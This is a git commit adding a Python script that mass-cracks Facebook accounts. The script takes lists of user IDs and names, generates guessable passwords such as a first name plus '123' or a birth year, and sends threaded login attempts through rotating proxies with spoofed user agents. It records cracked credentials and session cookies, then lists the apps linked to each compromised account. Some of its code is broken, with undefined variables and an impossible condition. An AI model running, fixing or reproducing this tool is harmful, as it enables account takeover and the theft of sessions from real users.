69a0e7de6a258e2f4c990359c894a79e38dae333
beosl <43722328+beosl@users.noreply.github.com>
2024-06-13 17:24:05 +0300

    Add files via upload

---
+++ xxxx.py
@@ -0,0 +1,363 @@
+print(('\033[92m—'*25)+'\n• DeCoDe By DEMO | @N_C_P •\n'+('—'*25))
+print('\x1b[92m  YOUR ID IS ACTIVE.........\x1b[97m')
+import os
+import sys
+import time
+import requests
+import bs4
+import json
+import os
+import sys
+import random
+import datetime
+import time
+import re
+import urllib3
+import rich
+import base64
+import uuid
+from rich.table import Table as me
+from rich.console import Console as sol
+from bs4 import BeautifulSoup as sop
+from concurrent.futures import ThreadPoolExecutor as tred
+from rich.console import Group as gp
+from rich.panel import Panel as nel
+from rich import print as cetak
+from rich.markdown import Markdown as mark
+from rich.columns import Columns as col
+from rich import print as rprint
+from rich import pretty
+from rich.text import Text as tekz
+pretty.install()
+CON = sol()
+ugen2 = []
+ugen = []
+cokbrut = []
+ses = requests.Session()
+princp = []
+try:
+    prox= requests.get('https://github.com/VAMPIRE/VAMPIRE/blob/main/.SALE-IP.txt').text
+    open('.VAMPIRE-IP.txt','w').write(prox)
+except Exception as e:
+    print(' ')
+prox=open('.VAMPIRE-IP.txt','r').read().splitlines()
+for xd in range(10000):
+    a = 'Mozilla/5.0 (Symbian/3; Series60/'
+    b = random.randrange(1, 9)
+    c = random.randrange(1, 9)
+    d = 'Nokia'
+    e = random.randrange(100, 9999)
+    f = '/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
+    g = random.randrange(1, 9)
+    h = random.randrange(1, 4)
+    i = random.randrange(1, 4)
+    j = random.randrange(1, 4)
+    k = 'Mobile Safari/535.1'
+    uaku = f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}'
+    ugen2.append(uaku)
+    aa = 'Mozilla/5.0 (Linux; U; Android'
+    b = random.choice(['6','7','8','9','10','11','12'])
+    c = ' en-us; GT-'
+    d = random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])
+    e = random.randrange(1, 999)
+    f = random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])
+    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    h = random.randrange(73, 100)
+    i = '0'
+    j = random.randrange(4200, 4900)
+    k = random.randrange(40, 150)
+    l = 'Mobile Safari/537.36'
+    uaku2 = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+for xd in range(10):
+    a = 'Mozilla/5.0 (Symbian/3; Series60/'
+    b = random.randrange(1, 9)
+    c = random.randrange(1, 9)
+    d = 'Nokia'
+    e = random.randrange(100, 9999)
+    f = '/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
+    g = random.randrange(1, 9)
+    h = random.randrange(1, 4)
+    i = random.randrange(1, 4)
+    j = random.randrange(1, 4)
+    k = 'Mobile Safari/535.1'
+    uaku = f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}'
+    ugen2.append(uaku)
+        
+def uaku():
+    try:
+        ua=open('bbnew.txt','r').read().splitlines()
+        for ub in ua:
+            ugen.append(ub)
+    except:
+        a=requests.get('https://github.com/VAMPIRE/VAMPIREFB/blob/main/.VAMPIRE-MOBILE.txt').text
+        ua=open('.VAMPIRE-MOBILE.txt','w')
+        aa=re.findall('line">(.*?)<',str(a))
+        for un in aa:
+            ua.write(un+'\n')
+        ua=open('.VAMPIRE-MOBILE.txt','r').read().splitlines()
+id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
+cokbrut=[]
+pwpluss=[]
+pwnya=[]
+P = '\x1b[1;97m'
+M = '\x1b[1;91m'
+H = '\x1b[1;92m'
+K = '\x1b[1;93m'
+B = '\x1b[1;94m'
+U = '\x1b[1;95m'
+O = '\x1b[1;96m'
+N = '\x1b[0m'
+Z = '\x1b[1;30m'
+sir = '\x1b[41m\x1b[1;97m'
+x = '\x1b[m'
+m = '\x1b[1;91m'
+k = '\x1b[93m'
+h = '\x1b[1;92m'
+hh = '\x1b[32m'
+u = '\x1b[95m'
+kk = '\x1b[33m'
+b = '\x1b[1;96m'
+p = '\x1b[0;34m'
+asu = random.choice([m,k,h,u,b])
+dic = {'1': 'January','2': 'February','3': 'March','4': 'April','5': 'May','6': 'June','7': 'July','8': 'August','9': 'September','10': 'October','11': 'November','12': 'December' }
+dic2 ={'1': 'January','2': 'February','3': 'March','4': 'April','5': 'May','6': 'June','7': 'July','8': 'August','9': 'September','10': 'October','11': 'November','12': 'December' }
+def masud(u):
+    for e in u + '':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.005)
+def clear():
+    os.system('clear')
+
+def back():
+    login()
+
+def banner():
+    print(('\033[92m—'*25)+'\n• DeCoDe By DEMO | @N_C_P •\n'+('—'*25))
+    print(''' \x1b[1;35m
+
+
+
+ ██ ▄█▀ ██▓ ██▓     ██▓    ▓█████  ██▀███     
+ ██▄█▒ ▓██▒▓██▒    ▓██▒    ▓█   ▀ ▓██ ▒ ██▒   
+▓███▄░ ▒██▒▒██░    ▒██░    ▒███   ▓██ ░▄█ ▒   
+▓██ █▄ ░██░▒██░    ▒██░    ▒▓█  ▄ ▒██▀▀█▄     
+▒██▒ █▄░██░░██████▒░██████▒░▒████▒░██▓ ▒██▒   
+▒ ▒▒ ▓▒░▓  ░ ▒░▓  ░░ ▒░▓  ░░░ ▒░ ░░ ▒▓ ░▒▓░   
+░ ░▒ ▒░ ▒ ░░ ░ ▒  ░░ ░ ▒  ░ ░ ░  ░  ░▒ ░ ▒░   
+░ ░░ ░  ▒ ░  ░ ░     ░ ░      ░     ░░   ░    
+░  ░    ░      ░  ░    ░  ░   ░  ░   ░
+      
+   
+
+''')
+    print(('\033[92m—'*25)+'\n• DeCoDe By DEMO | @N_C_P •\n'+('—'*25))
+        
+def menu():
+    os.system('clear')
+    banner()
+    print('')
+    print('')
+    print(' \x1b[1;37m[\x1b[1;92m01\x1b[1;37m] \x1b[1;37mFILE CRACK [\x1b[1;92m PRO \x1b[1;37m] ')
+    print('')
+    print('')
+    sale = input(' \x1b[1;37mHALBZHERA = ')
+    print('')
+    if sale in ('1', '01'):
+        File()
+        back()
+        
+
+def File():
+    try:
+        os.system('clear')
+        banner()
+        print('')
+        print('/sdcard/namefile.txt')
+        print('')
+        jum = input(' Name File = ')
+        print('')
+        for line in open(jum, 'r').readlines():
+            id.append(line.strip())
+        setting()
+    except requests.exceptions.ConnectionError:
+            print(' NO CONNECTION  ')
+            str()
+    except (KeyError,IOError):
+            print(' IS NOT FILE ')
+            time.sleep(3)
+            follower()
+            
+
+def setting():
+    os.system('clear')
+    banner()
+    hu = "3"
+    if hu in ['3','03']:
+        for bacot in id:
+            xx = random.randint(0,len(id2))
+            id2.insert(xx,bacot)
+    else:
+        str()
+        clear()
+        banner()
+    hc = "1"
+    if hc in ['1','01']:
+        method.append('mobile')
+        clear()
+        banner()
+        print('')
+        print('')
+    pwplus=input(' \x1b\x1b[1;33mAutoPassword \x1b[1;37m[ 1 ] \x1b[1;33m= ')
+    if pwplus in ['y','Y']:
+        pwpluss.append('ya')
+        pwku=input(' \x1b[38;5;98mAutoPassword [ Y/n ] = ')
+        pwkuh=pwku.split(',')
+        for xpw in pwkuh:
+            pwnya.append(xpw)
+    else:
+        pwpluss.append('no')
+    passwrd()
+        
+def passwrd():
+    print(('\033[92m—'*25)+'\n• DeCoDe By DEMO | @N_C_P •\n'+('—'*25))
+    with tred(max_workers=50) as pool:
+        for yuzong in id2:
+            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
+            frs = nmf.split(' ')[0]
+            pwv = []
+            if len(frs) == 3 and len(frs) == 4 and len(frs) == 5 and len(frs) == 6 and len(frs) == 7 and len(frs) == 8 and len(frs) == 9 and len(frs) == 10 and len(frs) == 11 or len(frs) == 12:
+                if len(frs)<3:
+                    pass
+                else:
+                    pwv.append(nmf)
+                    pwv.append(frs + '123')
+                    pwv.append(frs + '1234')
+                    pwv.append(frs + '12345')
+                    pwv.append(frs + '123456')
+                    pwv.append(frs + '1234567')
+                    pwv.append(frs + '12345678')
+                    pwv.append(frs + '123456789')
+                    pwv.append(frs + '1234567890')
+                    pwv.append(frs + '1122')
+                    pwv.append(frs + '1212')
+                    pwv.append(frs + '123321')
+                    pwv.append(frs + '123123')
+                    pwv.append(frs + '1221')
+                    pwv.append(frs + '1986')
+                    pwv.append(frs + '1987')
+                    pwv.append(frs + '1988')
+                    pwv.append(frs + '1989')
+                    pwv.append(frs + '1990')
+                    pwv.append(frs + '1991')
+                    pwv.append(frs + '1992')
+                    pwv.append('22446688')
+                    pwv.append('07500750')
+            else:
+                if len(frs)<3:
+                    pwv.append(nmf)
+                else:
+                    pwv.append(nmf)
+                    pwv.append(frs + '123')
+                    pwv.append(frs + '1234')
+                    pwv.append(frs + '12345')
+                    pwv.append(frs + '123456')
+                    pwv.append(frs + '1234567')
+                    pwv.append(frs + '12345678')
+                    pwv.append(frs + '123456789')
+                    pwv.append(frs + '1234567890')
+                    pwv.append(frs + '1122')
+                    pwv.append(frs + '1212')
+                    pwv.append(frs + '123321')
+                    pwv.append(frs + '123123')
+                    pwv.append(frs + '1221')
+                    pwv.append(frs + '1986')
+                    pwv.append(frs + '1987')
+                    pwv.append(frs + '1988')
+                    pwv.append(frs + '1989')
+                    pwv.append(frs + '1990')
+                    pwv.append(frs + '1991')
+                    pwv.append(frs + '1992')
+                    pwv.append('22446688')
+                    pwv.append('07500750')
+            if 'ya' in pwpluss:
+                for xpwd in pwnya:
+                    pwv.append(xpwd)
+            else:pass
+            if 'mobile' in method:
+                pool.submit(crack,idf,pwv)
+            else:
+                pool.submit(crack,idf,pwv)
+    print('')
+    print(' OK : %s ' % ok)
+    print(' CP : %s ' % cp)
+    print('')
+    str()
+def crack(idf,pwv):
+    global cp, ok, loop
+    bo = random.choice([u,k,kk,b,h,hh])
+    sys.stdout.write(f'\r \x1b[1;97m[ \x1b[1;97mKILLER \x1b[1;37m] \x1b[1;37m(\x1b[1;92mOK\x1b[1;30m-\x1b[1;93mCP\x1b[1;37m) \x1b[1;37m(\x1b[1;32m{ok}\x1b[1;30m-\x1b[1;33m{cp}\x1b[1;37m)\x1b[1;30m =\x1b[1;37m {loop}  ');sys.stdout.flush()
+    ua = random.choice(ugen)
+    ua2 = random.choice(ugen2)
+    ses = requests.Session()
+    for pw in pwv:
+        try:
+            nip=random.choice(prox)
+            proxs= {'http': 'socks4://'+nip}
+            ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
+            p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
+            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
+            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
+            koki+=' m_pixel_ratio=2.625; wd=412x756'
+            heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
+            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
+            if "checkpoint" in po.cookies.get_dict().keys():
+                print(f'\r\x1b[1;33m[ KILLER\x1b[1;33m ] \x1b[1;33m {idf} | {pw}\n[UserAgent]>{ua}')
+                open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
+                akun.append(idf + '|' + pw)
+                cp+=1
+            elif "c_user" in ses.cookies.get_dict().keys():
+                ok+=1
+                coki=po.cookies.get_dict()
+                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+                print(f'\r\x1b[1;32m[ KILLER\x1b[1;32m ] \x1b[1;92m {idf} | {pw} \n[COOKIES] {kuki} | \nUseragent\x1b[1;37m:\x1b[1;92m{ua}')
+                open('/storage/emulated/0/KILLER-OK/' + okc, 'a').write(idf + '|' + pw + '\n')
+                cek_apk(session, coki)
+
+            else:
+                ';'.join
+        except requests.exceptions.ConnectionError:
+            time.sleep(31)
+    loop+=1
+                        
+def cek_apk(session, cookie):
+    session = requests.Session()
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
+    sop = bs4.BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    try:
+        for i in range(len(game)):
+            print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
+    except AttributeError:
+        print ("\r    %s\033[0m cookie invalid"%(M))
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
+    sop = bs4.BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    try:
+        for i in range(len(game)):
+            print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
+    except AttributeError:
+        print ("\r    %s \033[0mcookie invalid"%(M))
+if __name__ == '__main__':
+    try:os.system('git pull')
+    except:pass
+    try:os.mkdir('OK')
+    except:pass
+    try:os.mkdir('CP')
+    except:pass
+    try:os.mkdir('data')
+    except:pass
+    menu()
